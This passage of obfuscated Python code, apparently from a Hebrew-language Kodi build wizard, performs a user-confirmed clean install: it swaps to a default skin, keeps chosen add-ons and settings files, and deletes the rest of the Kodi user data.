	(O0OOOO000OOOOOO00 )#line:4432
	O000O0O000O0OOO00 =(wiz .workingURL (O0OOOO000OOOOOO00 ))#line:4433
	(O000O0O000O0OOO00 )#line:4434
	if KEEPTRAKT =='true':#line:4435
		traktit .autoUpdate ('all')#line:4436
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4437
	if KEEPREAL =='true':#line:4438
		debridit .autoUpdate ('all')#line:4439
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4440
	if KEEPLOGIN =='true':#line:4441
		loginit .autoUpdate ('all')#line:4442
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4443
	if over ==True :O0O00OOOO0O0000O0 =1 #line:4444
	elif install =='restore':O0O00OOOO0O0000O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]בחרת לשחזר את הבילד מקובץ גיבוי קודם"%COLOR2 ,"האם להמשיך?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4445
	elif install :O0O00OOOO0O0000O0 =1 #line:4446
	else :O0O00OOOO0O0000O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]התקנת הבילד"%COLOR2 ,"מדיה סנטר?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4447
	if O0O00OOOO0O0000O0 :#line:4448
		if not wiz .currSkin ()in ['skin.confluence','skin.myconfluence','skin.estuary','skin.mediacenter.mod','skin.mediacenter.nox','skin.phenomenal','skin.Premium.mod']:#line:4449
			O0OO000O0OOOO000O ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.mediacenter.mod'if KODIV <17 else 'skin.myconfluence'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.mediacenter.nox'if KODIV <17 else 'skin.Premium.mod'#line:4450
			skinSwitch .swapSkins (O0OO000O0OOOO000O )#line:4453
			OOOO00OO00O00OOO0 =0 #line:4454
			xbmc .sleep (1000 )#line:4455
			while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOOO00OO00O00OOO0 <150 :#line:4456
				OOOO00OO00O00OOO0 +=1 #line:4457
				xbmc .sleep (1000 )#line:4458
				wiz .ebi ('SendAction(Select)')#line:4459
			if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4460
				wiz .ebi ('SendClick(11)')#line:4461
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:4462
			xbmc .sleep (1000 )#line:4463
		if not wiz .currSkin ()in ['skin.confluence','skin.myconfluence','skin.estuary','skin.mediacenter.mod','skin.mediacenter.nox','skin.phenomenal','skin.Premium.mod']:#line:4464
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Failed![/COLOR]'%COLOR2 )#line:4465
			return #line:4466
		wiz .addonUpdates ('set')#line:4467
		OOOO000OOO0OO0OO0 =os .path .abspath (HOME )#line:4468
		DP .create (ADDONTITLE ,"[COLOR %s]מחשב קבצים ותיקיות"%COLOR2 ,'','אנא המתן![/COLOR]')#line:4469
		OO00OO00O00OOOOO0 =sum ([len (O0OOO00OOO0OOO0OO )for O0OOOOOOOOOO00O00 ,OO0OO0O00OO0O0OOO ,O0OOO00OOO0OOO0OO in os .walk (OOOO000OOO0OO0OO0 )]);O00O0O0O00OO00000 =0 #line:4470
		DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:4471
		EXCLUDES .append ('My_Builds')#line:4472
		EXCLUDES .append ('archive_cache')#line:4473
		EXCLUDES .append ('script.module.requests')#line:4474
		EXCLUDES .append ('myfav.anon')#line:4475
		if KEEPREPOS =='true':#line:4476
			OOO0O0OOOO0OOO000 =glob .glob (os .path .join (ADDONS ,'repo*/'))#line:4477
			for O0O00O00OOOO0OO0O in OOO0O0OOOO0OOO000 :#line:4478
				OO00OOOO0OOOOO0OO =os .path .split (O0O00O00OOOO0OO0O [:-1 ])[1 ]#line:4479
				if not OO00OOOO0OOOOO0OO ==EXCLUDES :#line:4480
					EXCLUDES .append (OO00OOOO0OOOOO0OO )#line:4481
		if KEEPSUPER =='true':#line:4482
			EXCLUDES .append ('plugin.program.super.favourites')#line:4483
		if KEEPMOVIELIST =='true':#line:4484
			EXCLUDES .append ('plugin.video.metalliq')#line:4485
		if KEEPMOVIELIST =='true':#line:4486
			EXCLUDES .append ('plugin.video.mediacenter.wall')#line:4487
		if KEEPADDONS =='true':#line:4488
			EXCLUDES .append ('addons')#line:4489
		if KEEPADDONS =='true':#line:4490
			EXCLUDES .append ('addon_data')#line:4491
		EXCLUDES .append ('plugin.video.elementum')#line:4494
		EXCLUDES .append ('script.elementum.burst')#line:4495
		EXCLUDES .append ('script.elementum.burst-master')#line:4496
		EXCLUDES .append ('plugin.video.quasar')#line:4497
		EXCLUDES .append ('script.quasar.burst')#line:4498
		EXCLUDES .append ('skin.estuary')#line:4499
		if KEEPWHITELIST =='true':#line:4502
			OO0O0OO0OOO0O000O =''#line:4503
			OO0OO000O0OOOO00O =wiz .whiteList ('read')#line:4504
			if len (OO0OO000O0OOOO00O )>0 :#line:4505
				for O0O00O00OOOO0OO0O in OO0OO000O0OOOO00O :#line:4506
					try :O0000OO0OO0O00000 ,OO000OOO0O00000OO ,OOOOOOOOOOO00O00O =O0O00O00OOOO0OO0O #line:4507
					except :pass #line:4508
					if OOOOOOOOOOO00O00O .startswith ('pvr'):OO0O0OO0OOO0O000O =OO000OOO0O00000OO #line:4509
					O0OOO0O00OOO000OO =dependsList (OOOOOOOOOOO00O00O )#line:4510
					for OOO000OOOOO0OOO0O in O0OOO0O00OOO000OO :#line:4511
						if not OOO000OOOOO0OOO0O in EXCLUDES :#line:4512
							EXCLUDES .append (OOO000OOOOO0OOO0O )#line:4513
						OOOO00OOOO00000OO =dependsList (OOO000OOOOO0OOO0O )#line:4514
						for O000000O00O00O0OO in OOOO00OOOO00000OO :#line:4515
							if not O000000O00O00O0OO in EXCLUDES :#line:4516
								EXCLUDES .append (O000000O00O00O0OO )#line:4517
					if not OOOOOOOOOOO00O00O in EXCLUDES :#line:4518
						EXCLUDES .append (OOOOOOOOOOO00O00O )#line:4519
				if not OO0O0OO0OOO0O000O =='':wiz .setS ('pvrclient',OOOOOOOOOOO00O00O )#line:4520
		if wiz .getS ('pvrclient')=='':#line:4521
			for O0O00O00OOOO0OO0O in EXCLUDES :#line:4522
				if O0O00O00OOOO0OO0O .startswith ('pvr'):#line:4523
					wiz .setS ('pvrclient',O0O00O00OOOO0OO0O )#line:4524
		DP .update (0 ,"[COLOR %s]מנקה קבצים ותיקיות:"%COLOR2 )#line:4525
		O0O00OO00O00000O0 =wiz .latestDB ('Addons')#line:4526
		for OOO00000O0OOOO0OO ,OO000OOO000OO0OO0 ,O000O00O0OO0O0OO0 in os .walk (OOOO000OOO0OO0OO0 ,topdown =True ):#line:4527
			OO000OOO000OO0OO0 [:]=[O00OO00O0OO0000O0 for O00OO00O0OO0000O0 in OO000OOO000OO0OO0 if O00OO00O0OO0000O0 not in EXCLUDES ]#line:4528
			for O0000OO0OO0O00000 in O000O00O0OO0O0OO0 :#line:4529
				O00O0O0O00OO00000 +=1 #line:4530
				OOOOOOOOOOO00O00O =OOO00000O0OOOO0OO .replace ('/','\\').split ('\\')#line:4531
				OOOO00OO00O00OOO0 =len (OOOOOOOOOOO00O00O )-1 #line:4533
				if OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -2 ]=='userdata'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 ]and KEEPSKIN =='true':wiz .log ("Keep Skin: %s"%os .path .join (OOO00000O0OOOO0OO ,O0000OO0OO0O00000 ),xbmc .LOGNOTICE )#line:4534
				elif O0000OO0OO0O00000 =='MyVideos99.db'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -1 ]=='userdata'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (OOO00000O0OOOO0OO ,O0000OO0OO0O00000 ),xbmc .LOGNOTICE )#line:4535
				elif O0000OO0OO0O00000 =='MyVideos107.db'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -1 ]=='userdata'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (OOO00000O0OOOO0OO ,O0000OO0OO0O00000 ),xbmc .LOGNOTICE )#line:4536
				elif O0000OO0OO0O00000 =='MyVideos116.db'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -1 ]=='userdata'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (OOO00000O0OOOO0OO ,O0000OO0OO0O00000 ),xbmc .LOGNOTICE )#line:4537
				elif O0000OO0OO0O00000 =='MyVideos99.db'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -1 ]=='userdata'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OOO00000O0OOOO0OO ,O0000OO0OO0O00000 ),xbmc .LOGNOTICE )#line:4538
				elif O0000OO0OO0O00000 =='MyVideos107.db'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -1 ]=='userdata'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OOO00000O0OOOO0OO ,O0000OO0OO0O00000 ),xbmc .LOGNOTICE )#line:4539
				elif O0000OO0OO0O00000 =='MyVideos116.db'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -1 ]=='userdata'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OOO00000O0OOOO0OO ,O0000OO0OO0O00000 ),xbmc .LOGNOTICE )#line:4540
				elif OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -2 ]=='userdata'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -1 ]=='addon_data'and 'plugin.video.mediacenter.wall'in OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 ]and KEEPMOVIELIST =='true':wiz .log ("Keep View: %s"%os .path .join (OOO00000O0OOOO0OO ,O0000OO0OO0O00000 ),xbmc .LOGNOTICE )#line:4541
				elif OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -2 ]=='userdata'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -1 ]=='addon_data'and 'skin.mediacenter.mod'in OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OOO00000O0OOOO0OO ,O0000OO0OO0O00000 ),xbmc .LOGNOTICE )#line:4542
				elif OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -2 ]=='userdata'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -1 ]=='addon_data'and 'skin.Premium.mod'in OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OOO00000O0OOOO0OO ,O0000OO0OO0O00000 ),xbmc .LOGNOTICE )#line:4543
				elif OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -2 ]=='userdata'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -1 ]=='addon_data'and 'skin.mediacenter.nox'in OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OOO00000O0OOOO0OO ,O0000OO0OO0O00000 ),xbmc .LOGNOTICE )#line:4544
				elif OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -2 ]=='userdata'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -1 ]=='addon_data'and 'skin.phenomenal'in OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OOO00000O0OOOO0OO ,O0000OO0OO0O00000 ),xbmc .LOGNOTICE )#line:4545
				elif OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -2 ]=='userdata'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -1 ]=='addon_data'and 'plugin.video.metalliq'in OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 ]and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OOO00000O0OOOO0OO ,O0000OO0OO0O00000 ),xbmc .LOGNOTICE )#line:4546
				elif OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -2 ]=='userdata'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -1 ]=='addon_data'and 'skin.titan'in OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 ]and KEEPSKIN3 =='true':wiz .log ("Install titan: %s"%os .path .join (OOO00000O0OOOO0OO ,O0000OO0OO0O00000 ),xbmc .LOGNOTICE )#line:4548
				elif OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -2 ]=='userdata'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -1 ]=='addon_data'and 'pvr.iptvsimple'in OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 ]and KEEPPVR =='true':wiz .log ("Keep Pvr: %s"%os .path .join (OOO00000O0OOOO0OO ,O0000OO0OO0O00000 ),xbmc .LOGNOTICE )#line:4549
				elif O0000OO0OO0O00000 =='sources.xml'and OOOOOOOOOOO00O00O [-1 ]=='userdata'and KEEPSOURCES =='true':wiz .log ("Keep Sources: %s"%os .path .join (OOO00000O0OOOO0OO ,O0000OO0OO0O00000 ),xbmc .LOGNOTICE )#line:4551
				elif O0000OO0OO0O00000 =='quicknav.DATA.xml'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -2 ]=='userdata'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 ]and KEEPTVLIST =='true':wiz .log ("Keep Tv List: %s"%os .path .join (OOO00000O0OOOO0OO ,O0000OO0OO0O00000 ),xbmc .LOGNOTICE )#line:4554
				elif O0000OO0OO0O00000 =='x1101.DATA.xml'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -2 ]=='userdata'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (OOO00000O0OOOO0OO ,O0000OO0OO0O00000 ),xbmc .LOGNOTICE )#line:4555
				elif O0000OO0OO0O00000 =='b-srtym-b.DATA.xml'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -2 ]=='userdata'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (OOO00000O0OOOO0OO ,O0000OO0OO0O00000 ),xbmc .LOGNOTICE )#line:4556
				elif O0000OO0OO0O00000 =='x1102.DATA.xml'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -2 ]=='userdata'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (OOO00000O0OOOO0OO ,O0000OO0OO0O00000 ),xbmc .LOGNOTICE )#line:4557
				elif O0000OO0OO0O00000 =='b-sdrvt-b.DATA.xml'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -2 ]=='userdata'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (OOO00000O0OOOO0OO ,O0000OO0OO0O00000 ),xbmc .LOGNOTICE )#line:4558
				elif O0000OO0OO0O00000 =='x1112.DATA.xml'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -2 ]=='userdata'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (OOO00000O0OOOO0OO ,O0000OO0OO0O00000 ),xbmc .LOGNOTICE )#line:4559
				elif O0000OO0OO0O00000 =='b-tlvvyzyh-b.DATA.xml'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -2 ]=='userdata'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (OOO00000O0OOOO0OO ,O0000OO0OO0O00000 ),xbmc .LOGNOTICE )#line:4560
				elif O0000OO0OO0O00000 =='x1111.DATA.xml'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -2 ]=='userdata'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (OOO00000O0OOOO0OO ,O0000OO0OO0O00000 ),xbmc .LOGNOTICE )#line:4561
				elif O0000OO0OO0O00000 =='b-tvknyshrly-b.DATA.xml'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -2 ]=='userdata'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (OOO00000O0OOOO0OO ,O0000OO0OO0O00000 ),xbmc .LOGNOTICE )#line:4562
				elif O0000OO0OO0O00000 =='x1110.DATA.xml'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -2 ]=='userdata'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (OOO00000O0OOOO0OO ,O0000OO0OO0O00000 ),xbmc .LOGNOTICE )#line:4563
				elif O0000OO0OO0O00000 =='b-yldym-b.DATA.xml'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -2 ]=='userdata'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (OOO00000O0OOOO0OO ,O0000OO0OO0O00000 ),xbmc .LOGNOTICE )#line:4564
				elif O0000OO0OO0O00000 =='x1114.DATA.xml'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -2 ]=='userdata'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (OOO00000O0OOOO0OO ,O0000OO0OO0O00000 ),xbmc .LOGNOTICE )#line:4565
				elif O0000OO0OO0O00000 =='b-mvzyqh-b.DATA.xml'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -2 ]=='userdata'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (OOO00000O0OOOO0OO ,O0000OO0OO0O00000 ),xbmc .LOGNOTICE )#line:4566
				elif O0000OO0OO0O00000 =='mainmenu.DATA.xml'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -2 ]=='userdata'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (OOO00000O0OOOO0OO ,O0000OO0OO0O00000 ),xbmc .LOGNOTICE )#line:4567
				elif O0000OO0OO0O00000 =='skin.Premium.mod.properties'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -2 ]=='userdata'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (OOO00000O0OOOO0OO ,O0000OO0OO0O00000 ),xbmc .LOGNOTICE )#line:4568
				elif O0000OO0OO0O00000 =='favourites.xml'and OOOOOOOOOOO00O00O [-1 ]=='userdata'and KEEPFAVS =='true':wiz .log ("Keep Favourites: %s"%os .path .join (OOO00000O0OOOO0OO ,O0000OO0OO0O00000 ),xbmc .LOGNOTICE )#line:4572
				elif O0000OO0OO0O00000 =='guisettings.xml'and OOOOOOOOOOO00O00O [-1 ]=='userdata'and KEEPSOUND =='true':wiz .log ("Keep Sound: %s"%os .path .join (OOO00000O0OOOO0OO ,O0000OO0OO0O00000 ),xbmc .LOGNOTICE )#line:4574
				elif O0000OO0OO0O00000 =='profiles.xml'and OOOOOOOOOOO00O00O [-1 ]=='userdata'and KEEPPROFILES =='true':wiz .log ("Keep Profiles: %s"%os .path .join (OOO00000O0OOOO0OO ,O0000OO0OO0O00000 ),xbmc .LOGNOTICE )#line:4575
				elif O0000OO0OO0O00000 =='advancedsettings.xml'and OOOOOOOOOOO00O00O [-1 ]=='userdata'and KEEPADVANCED =='true':wiz .log ("Keep Advanced Settings: %s"%os .path .join (OOO00000O0OOOO0OO ,O0000OO0OO0O00000 ),xbmc .LOGNOTICE )#line:4576
				elif OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -2 ]=='userdata'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -1 ]=='addon_data'and 'plugin.video.sdarot.tv'in OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO00000O0OOOO0OO ,O0000OO0OO0O00000 ),xbmc .LOGNOTICE )#line:4577
				elif OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -2 ]=='userdata'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -1 ]=='addon_data'and 'program.apollo'in OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO00000O0OOOO0OO ,O0000OO0OO0O00000 ),xbmc .LOGNOTICE )#line:4578
				elif OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -2 ]=='userdata'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -1 ]=='addon_data'and 'plugin.video.allmoviesin'in OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO00000O0OOOO0OO ,O0000OO0OO0O00000 ),xbmc .LOGNOTICE )#line:4579
				elif OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -2 ]=='userdata'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -1 ]=='addon_data'and 'plugin.video.elementum'in OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO00000O0OOOO0OO ,O0000OO0OO0O00000 ),xbmc .LOGNOTICE )#line:4582
				elif OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -2 ]=='userdata'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -1 ]=='addon_data'and 'service.subtitles.All_Subs'in OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO00000O0OOOO0OO ,O0000OO0OO0O00000 ),xbmc .LOGNOTICE )#line:4583
				elif OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -2 ]=='userdata'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -1 ]=='addon_data'and 'plugin.audio.soundcloud'in OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO00000O0OOOO0OO ,O0000OO0OO0O00000 ),xbmc .LOGNOTICE )#line:4584
				elif OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -2 ]=='userdata'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -1 ]=='addon_data'and 'plugin.video.quasar'in OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO00000O0OOOO0OO ,O0000OO0OO0O00000 ),xbmc .LOGNOTICE )#line:4586
				elif OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -2 ]=='userdata'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -1 ]=='addon_data'and 'program.apollo'in OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO00000O0OOOO0OO ,O0000OO0OO0O00000 ),xbmc .LOGNOTICE )#line:4587
				elif OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -2 ]=='userdata'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -1 ]=='addon_data'and 'plugin.video.PastebinPlay'in OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO00000O0OOOO0OO ,O0000OO0OO0O00000 ),xbmc .LOGNOTICE )#line:4588
				elif OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -2 ]=='userdata'and OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 -1 ]=='addon_data'and 'plugin.video.playlistLoader'in OOOOOOOOOOO00O00O [OOOO00OO00O00OOO0 ]and KEEPPLAYLIST =='true':wiz .log ("Keep playlist: %s"%os .path .join (OOO00000O0OOOO0OO ,O0000OO0OO0O00000 ),xbmc .LOGNOTICE )#line:4589
				elif O0000OO0OO0O00000 in LOGFILES :wiz .log ("Keep Log File: %s"%O0000OO0OO0O00000 ,xbmc .LOGNOTICE )#line:4590
				elif O0000OO0OO0O00000 .endswith ('.db'):#line:4591
					try :#line:4592
						if O0000OO0OO0O00000 ==O0O00OO00O00000O0 and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(O0000OO0OO0O00000 ,KODIV ),xbmc .LOGNOTICE )#line:4593
						else :os .remove (os .path .join (OOO00000O0OOOO0OO ,O0000OO0OO0O00000 ))#line:4594
					except Exception as OO00OO000O0OO0O0O :#line:4595
						if not O0000OO0OO0O00000 .startswith ('Textures13'):#line:4596
							wiz .log ('Failed to delete, Purging DB',xbmc .LOGNOTICE )#line:4597
							wiz .log ("-> %s"%(str (OO00OO000O0OO0O0O )),xbmc .LOGNOTICE )#line:4598
							wiz .purgeDb (os .path .join (OOO00000O0OOOO0OO ,O0000OO0OO0O00000 ))#line:4599
				else :#line:4600
					DP .update (int (wiz .percentage (O00O0O0O00OO00000 ,OO00OO00O00OOOOO0 )),'','[COLOR %s]File: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0000OO0OO0O00000 ),'')#line:4601
					try :os .remove (os .path .join (OOO00000O0OOOO0OO ,O0000OO0OO0O00000 ))#line:4602
					except Exception as OO00OO000O0OO0O0O :#line:4603
						wiz .log ("Error removing %s"%os .path .join (OOO00000O0OOOO0OO ,O0000OO0OO0O00000 ),xbmc .LOGNOTICE )#line:4604
						wiz .log ("-> / %s"%(str (OO00OO000O0OO0O0O )),xbmc .LOGNOTICE )#line:4605
			if DP .iscanceled ():#line:4606
				DP .close ()#line:4607
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:4608
				return False #line:4609
